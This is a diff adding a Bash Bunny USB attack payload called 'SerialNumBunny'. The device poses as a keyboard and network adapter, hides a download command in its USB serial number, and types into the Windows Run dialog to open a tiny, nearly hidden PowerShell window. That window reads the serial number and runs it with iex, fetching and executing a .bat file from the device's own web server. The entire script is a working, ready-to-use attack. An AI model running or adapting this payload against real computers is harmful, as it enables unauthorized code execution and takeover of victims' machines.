@@ -1,0 +1,31 @@
+# Title:         SerialNumBunny
+# Description:   Execute strings placed in the Bunny serial number
+# Author:        0i41E
+# Version:       1.0
+# Category:      Execution
+# Attackmodes:   HID, RNDIS_ETHERNET
+
+# Starting as Ethernet device only first to get IP
+LED SETUP
+ATTACKMODE RNDIS_ETHERNET
+
+GET SWITCH_POSITION
+GET HOST_IP
+
+# Switch to Ethernet & HID 
+LED Y
+# Defining Device Identifiers - Serialnumber contains payload
+ATTACKMODE RNDIS_ETHERNET HID VID_0XF000 PID_0X1234 MAN_HAK5 PROD_BASHBUNNY SN_IWR_-URI_HTTP://$HOST_IP/1.bat
+cd /home/draco
+gohttp -p 80 &
+
+#Opens hidden powershell instance
+Q GUI r
+QUACK DELAY 300
+QUACK STRING "powershell.exe -NoExit -Command \"[console]::WindowHeight=1; [console]::WindowWidth=10\""
+QUACK ENTER
+QUACK DELAY 300
+Q STRING "((Get-PnpDevice -PresentOnly -Class USB | Where-Object { \$_.DeviceID -like \"*F000*\" } | ForEach-Object { (\$_).DeviceID -split '\\\\' | Select-Object -Last 1 }) -join '').Replace('_', ' ')|iex|iex"
+Q DELAY 400
+Q ENTER
+LED FINISH 
